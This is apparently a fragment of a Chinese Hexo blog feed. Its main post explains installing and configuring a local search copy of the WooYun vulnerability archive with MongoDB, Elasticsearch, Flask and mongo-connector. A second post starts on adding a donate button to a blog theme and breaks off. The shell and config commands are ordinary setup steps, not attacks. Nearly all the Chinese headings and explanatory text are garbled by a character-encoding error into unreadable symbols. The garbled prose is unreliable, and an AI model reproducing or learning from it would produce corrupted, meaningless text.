id="ubuntuä¸‹å®‰è£…"><a href="#ubuntuä¸‹å®‰è£…" class="headerlink" title="ubuntuä¸‹å®‰è£…"></a>ubuntuä¸‹å®‰è£…</h1><h2 id="1ã€å®‰è£…pythonã€pipã€mongodb"><a href="#1ã€å®‰è£…pythonã€pipã€mongodb" class="headerlink" title="1ã€å®‰è£…pythonã€pipã€mongodb"></a>1ã€å®‰è£…pythonã€pipã€mongodb</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install python python-pip mongodb</span><br></pre></td></tr></table></figure><h2 id="2ã€å®‰è£…scrapy"><a href="#2ã€å®‰è£…scrapy" class="headerlink" title="2ã€å®‰è£…scrapy"></a>2ã€å®‰è£…scrapy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å®‰è£…scrapyå¦‚æœæŠ¥é”™ï¼Œåˆ™å…ˆapt-getå®‰è£…ä¸‹è¿°ä¾èµ–åŒ…ï¼Œç„¶åå®‰è£…pipå®‰è£…lxmlåå³å¯æ­£å¸¸å®‰è£…scrapy</span><br><span class="line">sudo apt-get install libxml2-dev libxslt1-dev python-dev zlib1g-dev libevent-dev python-openssl</span><br><span class="line"></span><br><span class="line">sudo pip install lxml</span><br><span class="line">sudo pip install scrapy</span><br></pre></td></tr></table></figure><h2 id="3ã€å®‰è£…pymongoå’Œflaskï¼ˆæˆ–tornadoï¼‰"><a href="#3ã€å®‰è£…pymongoå’Œflaskï¼ˆæˆ–tornadoï¼‰" class="headerlink" title="3ã€å®‰è£…pymongoå’Œflaskï¼ˆæˆ–tornadoï¼‰"></a>3ã€å®‰è£…pymongoå’Œflaskï¼ˆæˆ–tornadoï¼‰</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install flask pymongo</span><br><span class="line">(sudo pip install tornado)</span><br></pre></td></tr></table></figure><h2 id="4ã€ä»githubä¸‹è½½æºç "><a href="#4ã€ä»githubä¸‹è½½æºç " class="headerlink" title="4ã€ä»githubä¸‹è½½æºç "></a>4ã€ä»githubä¸‹è½½æºç </h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;hanc00l&#x2F;wooyun_public</span><br></pre></td></tr></table></figure><h1 id="çˆ¬è™«"><a href="#çˆ¬è™«" class="headerlink" title="çˆ¬è™«"></a>çˆ¬è™«</h1><p>é‰´äºwooyunå·²ç»å…³äº† å…¶å®è¿™é‡Œçš„çˆ¬è™«å·²ç»æ²¡æœ‰ç”¨äº†~ æ‰€ä»¥è¯¦ç»†æ­¥éª¤å°±ä¸å†™äº†</p><h1 id="æœç´¢"><a href="#æœç´¢" class="headerlink" title="æœç´¢"></a>æœç´¢</h1><blockquote><p>æ¼æ´æœç´¢ä½¿ç”¨äº†Flaskä½œä¸ºweb serverï¼Œbootstrapä½œä¸ºå‰ç«¯ï¼ˆ8.12å¢åŠ tornador web serverï¼Œå¯é…åˆnginxåå‘ä»£ç†ï¼Œæ”¯æŒé«˜å¹¶å‘çš„åº”ç”¨ï¼‰<br>å¯åŠ¨web server ï¼šåœ¨flaskç›®å½•ä¸‹è¿è¡Œ./app.pyï¼Œé»˜è®¤ç«¯å£æ˜¯5000<br>å¯åŠ¨Elassticsearchï¼ˆå¦‚æœå·²é…ç½®äº†Elasticsearchï¼‰ï¼šåœ¨elasticsearch-2.3.4/binç›®å½•ä¸‹è¿è¡Œ./elasticsearch -d (-dè¡¨ç¤ºä»¥åå°æ–¹å¼è¿è¡Œï¼‰<br>æœç´¢ï¼šåœ¨æµè§ˆå™¨é€šè¿‡<a href="http://localhost:5000è¿›è¡Œæœç´¢æ¼æ´ï¼Œå¤šä¸ªå…³é”®å­—å¯ä»¥ç”¨ç©ºæ ¼åˆ†å¼€ã€‚">http://localhost:5000è¿›è¡Œæœç´¢æ¼æ´ï¼Œå¤šä¸ªå…³é”®å­—å¯ä»¥ç”¨ç©ºæ ¼åˆ†å¼€ã€‚</a><br>é»˜è®¤ä½¿ç”¨mongodbçš„æ•°æ®åº“æœç´¢ï¼Œåœ¨è¿›è¡Œå…¨æ–‡æœç´¢æ—¶æ¯”è¾ƒæ…¢ï¼Œæ¨èå®‰è£…ä½¿ç”¨Elasicsearchæœç´¢å¼•æ“ã€‚</p></blockquote><h1 id="å®‰è£…å’Œé…ç½®Elasicsearchçš„æ–¹æ³•ï¼ˆç‚¹æˆ‘ï¼‰"><a href="#å®‰è£…å’Œé…ç½®Elasicsearchçš„æ–¹æ³•ï¼ˆç‚¹æˆ‘ï¼‰" class="headerlink" title="å®‰è£…å’Œé…ç½®Elasicsearchçš„æ–¹æ³•ï¼ˆç‚¹æˆ‘ï¼‰"></a>å®‰è£…å’Œé…ç½®Elasicsearchçš„æ–¹æ³•ï¼ˆç‚¹æˆ‘ï¼‰</h1><h2 id="å®‰è£…elasticsearch"><a href="#å®‰è£…elasticsearch" class="headerlink" title="å®‰è£…elasticsearch"></a>å®‰è£…elasticsearch</h2><h3 id="1ã€å®‰è£…JDKï¼ˆæˆ–è€…JREï¼‰"><a href="#1ã€å®‰è£…JDKï¼ˆæˆ–è€…JREï¼‰" class="headerlink" title="1ã€å®‰è£…JDKï¼ˆæˆ–è€…JREï¼‰"></a>1ã€å®‰è£…JDKï¼ˆæˆ–è€…JREï¼‰</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install openjdk-7-jdk</span><br></pre></td></tr></table></figure><h3 id="2ã€ä¸‹è½½elasticseach"><a href="#2ã€ä¸‹è½½elasticseach" class="headerlink" title="2ã€ä¸‹è½½elasticseach"></a>2ã€ä¸‹è½½elasticseach</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wget https:&#x2F;&#x2F;download.elastic.co&#x2F;elasticsearch&#x2F;release&#x2F;org&#x2F;elasticsearch&#x2F;distribution&#x2F;tar&#x2F;elasticsearch&#x2F;2.3.4&#x2F;elasticsearch-2.3.4.tar.gz</span><br><span class="line">tar xvf elasticsearch-2.3.4.tar.gz</span><br></pre></td></tr></table></figure><h3 id="3ã€è¿è¡Œelasticsearch"><a href="#3ã€è¿è¡Œelasticsearch" class="headerlink" title="3ã€è¿è¡Œelasticsearch"></a>3ã€è¿è¡Œelasticsearch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd elasticsearch-2.3.4&#x2F;bin</span><br><span class="line">.&#x2F;elasticsearch</span><br></pre></td></tr></table></figure><h3 id="4ã€æµ‹è¯•ä¸€ä¸‹ï¼Œå®‰è£…å®Œæˆè¿è¡Œåelasticsearchä¼šåœ¨9200ç«¯å£ä¸Šè¿›è¡Œç›‘å¬"><a href="#4ã€æµ‹è¯•ä¸€ä¸‹ï¼Œå®‰è£…å®Œæˆè¿è¡Œåelasticsearchä¼šåœ¨9200ç«¯å£ä¸Šè¿›è¡Œç›‘å¬" class="headerlink" title="4ã€æµ‹è¯•ä¸€ä¸‹ï¼Œå®‰è£…å®Œæˆè¿è¡Œåelasticsearchä¼šåœ¨9200ç«¯å£ä¸Šè¿›è¡Œç›‘å¬"></a>4ã€æµ‹è¯•ä¸€ä¸‹ï¼Œå®‰è£…å®Œæˆè¿è¡Œåelasticsearchä¼šåœ¨9200ç«¯å£ä¸Šè¿›è¡Œç›‘å¬</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET http:&#x2F;&#x2F;localhost:9200</span><br><span class="line">&#123;</span><br><span class="line">  &quot;name&quot; : &quot;Sebastian Shaw&quot;,</span><br><span class="line">  &quot;cluster_name&quot; : &quot;elasticsearch&quot;,</span><br><span class="line">  &quot;version&quot; : &#123;</span><br><span class="line">    &quot;number&quot; : &quot;2.3.4&quot;,</span><br><span class="line">    &quot;build_hash&quot; : &quot;e455fd0c13dceca8dbbdbb1665d068ae55dabe3f&quot;,</span><br><span class="line">    &quot;build_timestamp&quot; : &quot;2016-06-30T11:24:31Z&quot;,</span><br><span class="line">    &quot;build_snapshot&quot; : false,</span><br><span class="line">    &quot;lucene_version&quot; : &quot;5.5.0&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;tagline&quot; : &quot;You Know, for Search&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="é…ç½®mongodb"><a href="#é…ç½®mongodb" class="headerlink" title="é…ç½®mongodb"></a>é…ç½®mongodb</h2><h3 id="1ã€ç¼–è¾‘-etc-mongodb-confï¼Œå¢åŠ ï¼š"><a href="#1ã€ç¼–è¾‘-etc-mongodb-confï¼Œå¢åŠ ï¼š" class="headerlink" title="1ã€ç¼–è¾‘/etc/mongodb.confï¼Œå¢åŠ ï¼š"></a>1ã€ç¼–è¾‘/etc/mongodb.confï¼Œå¢åŠ ï¼š</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">replSet&#x3D;rs0 #è¿™é‡Œæ˜¯æŒ‡å®šreplSetçš„åå­— </span><br><span class="line">oplogSize&#x3D;100 #è¿™é‡Œæ˜¯æŒ‡å®šoplogè¡¨æ•°æ®å¤§å°ï¼ˆå¤ªå¤§äº†ä¸æ”¯æŒï¼‰</span><br></pre></td></tr></table></figure><p><code>é‡å¯åŠ¨mongodb</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo service mongodb restart</span><br></pre></td></tr></table></figure><h3 id="2ï¼Œè¿›å…¥mongodb-shellï¼Œåˆå§‹åŒ–replicSet"><a href="#2ï¼Œè¿›å…¥mongodb-shellï¼Œåˆå§‹åŒ–replicSet" class="headerlink" title="2ï¼Œè¿›å…¥mongodb shellï¼Œåˆå§‹åŒ–replicSet"></a>2ï¼Œè¿›å…¥mongodb shellï¼Œåˆå§‹åŒ–replicSet</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mongo</span><br><span class="line">rs.initiate( &#123;&quot;_id&quot; : &quot;rs0&quot;, &quot;version&quot; : 1, &quot;members&quot; : [ &#123; &quot;_id&quot; : 0, &quot;host&quot; : &quot;127.0.0.1:27017&quot; &#125; ]&#125;) </span><br></pre></td></tr></table></figure><h3 id="3ï¼Œæ­å»ºå¥½replicSetä¹‹åï¼Œé€€å‡ºmongo-shellé‡æ–°ç™»å½•ï¼Œæç¤ºç¬¦ä¼šå˜æˆï¼šrs0-PRIMARY-gt-ï¼Œå°±å¯ä»¥é€€å‡ºMongodb"><a href="#3ï¼Œæ­å»ºå¥½replicSetä¹‹åï¼Œé€€å‡ºmongo-shellé‡æ–°ç™»å½•ï¼Œæç¤ºç¬¦ä¼šå˜æˆï¼šrs0-PRIMARY-gt-ï¼Œå°±å¯ä»¥é€€å‡ºMongodb" class="headerlink" title="3ï¼Œæ­å»ºå¥½replicSetä¹‹åï¼Œé€€å‡ºmongo shellé‡æ–°ç™»å½•ï¼Œæç¤ºç¬¦ä¼šå˜æˆï¼šrs0:PRIMARY&gt;ï¼Œå°±å¯ä»¥é€€å‡ºMongodb"></a>3ï¼Œæ­å»ºå¥½replicSetä¹‹åï¼Œé€€å‡ºmongo shellé‡æ–°ç™»å½•ï¼Œæç¤ºç¬¦ä¼šå˜æˆï¼šrs0:PRIMARY&gt;ï¼Œå°±å¯ä»¥é€€å‡ºMongodb</h3><h2 id="å®‰è£…ä¸­æ–‡åˆ†è¯æ’ä»¶elasticsearch-analysis-ik"><a href="#å®‰è£…ä¸­æ–‡åˆ†è¯æ’ä»¶elasticsearch-analysis-ik" class="headerlink" title="å®‰è£…ä¸­æ–‡åˆ†è¯æ’ä»¶elasticsearch-analysis-ik"></a>å®‰è£…ä¸­æ–‡åˆ†è¯æ’ä»¶elasticsearch-analysis-ik</h2><h3 id="1ã€ä»githubä¸‹è½½ç¼–è¯‘å¥½å¥½çš„æ’ä»¶"><a href="#1ã€ä»githubä¸‹è½½ç¼–è¯‘å¥½å¥½çš„æ’ä»¶" class="headerlink" title="1ã€ä»githubä¸‹è½½ç¼–è¯‘å¥½å¥½çš„æ’ä»¶"></a>1ã€ä»githubä¸‹è½½ç¼–è¯‘å¥½å¥½çš„æ’ä»¶</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">cd ~  </span><br><span class="line">sudo apt-get install unzip</span><br><span class="line">wget https:&#x2F;&#x2F;github.com&#x2F;medcl&#x2F;elasticsearch-analysis-ik&#x2F;releases&#x2F;download&#x2F;v1.9.4&#x2F;elasticsearch-analysis-ik-1.9.4.zip</span><br><span class="line">unzip elasticsearch-analysis-ik-1.9.4.zip</span><br></pre></td></tr></table></figure><h3 id="2ã€å°†æ’ä»¶å¤åˆ¶åˆ°elasticsearchçš„pluginsç›®å½•"><a href="#2ã€å°†æ’ä»¶å¤åˆ¶åˆ°elasticsearchçš„pluginsç›®å½•" class="headerlink" title="2ã€å°†æ’ä»¶å¤åˆ¶åˆ°elasticsearchçš„pluginsç›®å½•"></a>2ã€å°†æ’ä»¶å¤åˆ¶åˆ°elasticsearchçš„pluginsç›®å½•</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cp -r elasticsearch-analysis-ik elasticsearch-2.3.4&#x2F;plugins</span><br></pre></td></tr></table></figure><h3 id="3ã€ä¿®æ”¹elasticsearch-ymlé…ç½®ï¼Œå®šä¹‰æ’ä»¶é…ç½®"><a href="#3ã€ä¿®æ”¹elasticsearch-ymlé…ç½®ï¼Œå®šä¹‰æ’ä»¶é…ç½®" class="headerlink" title="3ã€ä¿®æ”¹elasticsearch.ymlé…ç½®ï¼Œå®šä¹‰æ’ä»¶é…ç½®"></a>3ã€ä¿®æ”¹elasticsearch.ymlé…ç½®ï¼Œå®šä¹‰æ’ä»¶é…ç½®</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vi elasticsearch-2.3.4&#x2F;config&#x2F;elasticsearch.yml</span><br></pre></td></tr></table></figure><p><strong>åœ¨æœ€åå¢åŠ :</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">index.analysis.analyzer.ik.type : &#39;ik&#39;</span><br><span class="line">index.analysis.analyzer.default.type : &#39;ik&#39;</span><br></pre></td></tr></table></figure><h3 id="4ã€é€€å‡ºå¹¶é‡å¯elasticsearch"><a href="#4ã€é€€å‡ºå¹¶é‡å¯elasticsearch" class="headerlink" title="4ã€é€€å‡ºå¹¶é‡å¯elasticsearch"></a>4ã€é€€å‡ºå¹¶é‡å¯elasticsearch</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elasticsearch-2.3.4&#x2F;bin&#x2F;elasticsearch -d</span><br><span class="line"> (-dè¡¨ç¤ºä»¥åå°æ–¹å¼è¿è¡Œï¼‰</span><br></pre></td></tr></table></figure><h2 id="å®‰è£…mongo-connectorï¼Œå°†æ•°æ®åŒæ­¥åˆ°elasticsearch"><a href="#å®‰è£…mongo-connectorï¼Œå°†æ•°æ®åŒæ­¥åˆ°elasticsearch" class="headerlink" title="å®‰è£…mongo-connectorï¼Œå°†æ•°æ®åŒæ­¥åˆ°elasticsearch"></a>å®‰è£…mongo-connectorï¼Œå°†æ•°æ®åŒæ­¥åˆ°elasticsearch</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install mongo-connector elastic2_doc_manager</span><br><span class="line">sudo mongo-connector -m localhost:27017 -t localhost:9200 -d elastic2_doc_manager</span><br></pre></td></tr></table></figure><p>æ˜¾ç¤ºLogging to mongo-connector.log.åå°†ä¼šæŠŠmongodbæ•°æ®åº“çš„ä¿¡æ¯åŒæ­¥åˆ°elasticsearchä¸­ï¼Œå®Œå…¨åŒæ­¥å®Œæˆä¼°è®¡éœ€è¦30åˆ†é’Ÿå·¦å³ï¼ŒåŒæ­¥æœŸé—´ä¸èƒ½ä¸­æ–­ï¼Œå¦åˆ™å¯èƒ½å¯¼è‡´elasticsearchä¸mongodbæ•°æ®ä¸ä¸€è‡´ã€‚</p><p>åœ¨åŒæ­¥è¿‡ç¨‹ä¸­ï¼Œå¯èƒ½ä¼šæŠ¥é”™ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">OperationFailed: ConnectionTimeout caused by - ReadTimeoutError(HTTPConnectionPool(host&#x3D;u&#39;localhost&#39;, port&#x3D;9200): Read timed out. (read timeout&#x3D;10))</span><br><span class="line">2016-08-04 17:24:53,372 [ERROR] mongo_connector.oplog_manager:633 - OplogThread: Failed during dump collection cannot recover! Collection(Database(MongoClient(u&#39;127.0.0.1&#39;, 27017), u&#39;local&#39;), u&#39;oplog.rs&#39;)</span><br><span class="line">2016-08-04 17:24:54,371 [ERROR] mongo_connector.connector:304 - MongoConnector: OplogThread &lt;OplogThread(Thread-7, started 140485117060864)&gt; unexpectedly stopped! Shutting down</span><br></pre></td></tr></table></figure><p><strong>è§£å†³åŠæ³•:</strong><br>ä¿®æ”¹timeoutå€¼ï¼Œä»é»˜è®¤çš„10æ”¹ä¸º200</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo vi &#x2F;usr&#x2F;local&#x2F;lib&#x2F;python2.7&#x2F;dist-packages&#x2F;mongo_connector&#x2F;doc_managers&#x2F;elastic2_doc_manager.py</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">å°†ï¼š</span><br><span class="line">self.elastic &#x3D; Elasticsearch(hosts&#x3D;[url],**kwargs.get(&#39;clientOptions&#39;, &#123;&#125;))</span><br><span class="line"></span><br><span class="line">ä¿®æ”¹ä¸ºï¼š</span><br><span class="line">self.elastic &#x3D; Elasticsearch(hosts&#x3D;[url],timeout&#x3D;200, **kwargs.get(&#39;clientOptions&#39;, &#123;&#125;))</span><br></pre></td></tr></table></figure><h2 id="å¯ç”¨å…¨æ–‡æœç´¢"><a href="#å¯ç”¨å…¨æ–‡æœç´¢" class="headerlink" title="å¯ç”¨å…¨æ–‡æœç´¢"></a>å¯ç”¨å…¨æ–‡æœç´¢</h2><h3 id="1ã€å®‰è£…elasticsearch-py"><a href="#1ã€å®‰è£…elasticsearch-py" class="headerlink" title="1ã€å®‰è£…elasticsearch-py"></a>1ã€å®‰è£…elasticsearch-py</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install elasticsearch</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="2ã€æ›´æ–°app-py"><a href="#2ã€æ›´æ–°app-py" class="headerlink" title="2ã€æ›´æ–°app.py"></a>2ã€æ›´æ–°app.py</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ~&#x2F;wooyun_public</span><br><span class="line">git pull</span><br></pre></td></tr></table></figure><h3 id="3ã€ä¿®æ”¹app-py"><a href="#3ã€ä¿®æ”¹app-py" class="headerlink" title="3ã€ä¿®æ”¹app.py"></a>3ã€ä¿®æ”¹app.py</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vi ~&#x2F;wooyun_public&#x2F;flask&#x2F;app.py</span><br><span class="line">ä¿®æ”¹:</span><br><span class="line">    SEARCH_BY_ES &#x3D; &#39;auto&#39;</span><br></pre></td></tr></table></figure><h1 id="ä¸ºmongodbæ•°æ®åº“åˆ›å»ºç´¢å¼•"><a href="#ä¸ºmongodbæ•°æ®åº“åˆ›å»ºç´¢å¼•" class="headerlink" title="ä¸ºmongodbæ•°æ®åº“åˆ›å»ºç´¢å¼•"></a>ä¸ºmongodbæ•°æ®åº“åˆ›å»ºç´¢å¼•</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mongo</span><br><span class="line">use wooyun</span><br><span class="line">db.wooyun_list.ensureIndex(&#123;&quot;datetime&quot;:1&#125;)</span><br><span class="line">db.wooyun_drops.ensureIndex(&#123;&quot;datetime&quot;:1&#125;)</span><br></pre></td></tr></table></figure><h1 id="Pushå†…å®¹"><a href="#Pushå†…å®¹" class="headerlink" title="Pushå†…å®¹"></a>Pushå†…å®¹</h1><p>ä¸€å…±æœ‰ä¸¤éƒ¨åˆ†å†…å®¹ï¼Œä¸€ä»½å†…å®¹åœ¨<code> wooyun_public/flask/static</code><br>å°±æ˜¯statciæ•´ä¸ªæ–‡ä»¶åŒ…å«äº†å¤§éƒ¨åˆ†å†…å®¹<br>è¿˜æœ‰ä¸€ä»½å†…å®¹åœ¨<code>mongodb</code>æ•°æ®åº“é‡Œé¢~ éœ€è¦æ‰“åŒ…ä¸‹æ¥<br>æ‰“åŒ…å‘½ä»¤æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongodump -h 127.0.0.1 -o &#x2F;home&#x2F;wooyun&#x2F;mongodb&#x2F;</span><br></pre></td></tr></table></figure><p>åé¢çš„åœ°å€æ˜¯ä¿å­˜è·¯å¾„<br>è¿˜åŸæ•°æ®åº“å‘½ä»¤æ˜¯</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mongorestore   &#x2F;home&#x2F;wooyun&#x2F;mongodb&#x2F;</span><br></pre></td></tr></table></figure><h1 id="è™šæ‹Ÿæœºä¸‹è½½åœ°å€"><a href="#è™šæ‹Ÿæœºä¸‹è½½åœ°å€" class="headerlink" title="è™šæ‹Ÿæœºä¸‹è½½åœ°å€"></a>è™šæ‹Ÿæœºä¸‹è½½åœ°å€</h1><p><a href="http://pan.baidu.com/s/1kVtY2rX">http://pan.baidu.com/s/1kVtY2rX </a>   æå–å¯†ç ï¼š5ik7  PS:è¿™ä¸ªæ˜¯<code>hancool</code>å‰è¾ˆåšçš„</p><h1 id="å…¶ä»–"><a href="#å…¶ä»–" class="headerlink" title="å…¶ä»–"></a>å…¶ä»–</h1><p>ä¸»è¦å†…å®¹éƒ½æ˜¯copyäº†æ˜¯<code>hancool</code>å‰è¾ˆçš„çš„æ–‡ç« ~<br>æ–‡ç« åœ°å€åœ¨github å¦‚æœæƒ³ç”¨è™šæ‹Ÿæœºæˆ–è€…çœ‹æ›´è¯¦ç»†çš„å†…å®¹ å¯ä»¥ä»å»githubçœ‹çœ‹<a href="https://github.com/hanc00l/wooyun_public">https://github.com/hanc00l/wooyun_public</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> ç¯å¢ƒé…ç½® </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wooyun </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Hexo åšå®¢æ·»åŠ æ‰“èµåŠŸèƒ½</title>
      <link href="hexo-donate.html"/>
      <url>hexo-donate.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>ä»¥<code>spfk</code>ä¸»é¢˜ä¸ºä¾‹å­~  </p><h1 id="ç¬¬ä¸€æ­¥-æ–°å¢æ‰“èµæ¨¡å—"><a href="#ç¬¬ä¸€æ­¥-æ–°å¢æ‰“èµæ¨¡å—" class="headerlink" title="ç¬¬ä¸€æ­¥:æ–°å¢æ‰“èµæ¨¡å—"></a>ç¬¬ä¸€æ­¥:æ–°å¢æ‰“èµæ¨¡å—</h1><p><strong>layout_partial</strong>ç›®å½•ä¸‹ æ–°å»º <strong>donate.ejs</strong>  å†™ä¸Šä»¥ä¸‹å†…å®¹</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">!</span> <span class="attr">--</span> æ·»åŠ æèµ å›¾æ ‡ <span class="attr">--</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span> =<span class="string">&quot;post-donate&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;donate_board&quot;</span> <span class="attr">class</span>=<span class="string">&quot;donate_bar center&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">a</span> <span class="attr">id</span>=<span class="string">&quot;btn_donate&quot;</span> <span class="attr">class</span>=<span class="string">&quot;btn_donate&quot;</span> <span class="attr">href</span>=<span class="string">&quot;javascript:;&quot;</span> <span class="attr">title</span>=<span class="string">&quot;æ‰“èµ&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;donate_txt&quot;</span>&gt;</span></span><br><span class="line">           <span class="symbol">&amp;uarr;</span><span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">%=theme.donate_message%</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">br</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">&quot;donate_guide&quot;</span> <span class="attr">class</span>=<span class="string">&quot;donate_bar center hidden&quot;</span> &gt;</span></span><br><span class="line"><span class="comment">&lt;!-- æ”¯ä»˜å®æ‰“èµå›¾æ¡ˆ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/img/zhifubao.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;æ”¯ä»˜å®æ‰“èµ&quot;</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!-- å¾®ä¿¡æ‰“èµå›¾æ¡ˆ --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;/img/weixin.jpg&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;å¾®ä¿¡æ‰“èµ&quot;</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span></span><br><span class="line"><span class="javascript"><span class="built_in">document</span>.getElementById(<span class="string">&#x27;btn_donate&#x27;</span>).onclick = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span></span><br><span class="line"><span class="javascript">$(<span class="string">&#x27;#donate_board&#x27;</span>).addClass(<span class="string">&#x27;hidden&#x27;</span>);</span></span><br><span class="line"><span class="javascript">$(<span class="string">&#x27;#donate_guide&#x27;</span>).removeClass(<span class="string">&#x27;hidden&#x27;</span>);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">!</span> <span class="attr">--</span> æ·»åŠ æèµ å›¾æ ‡ <span 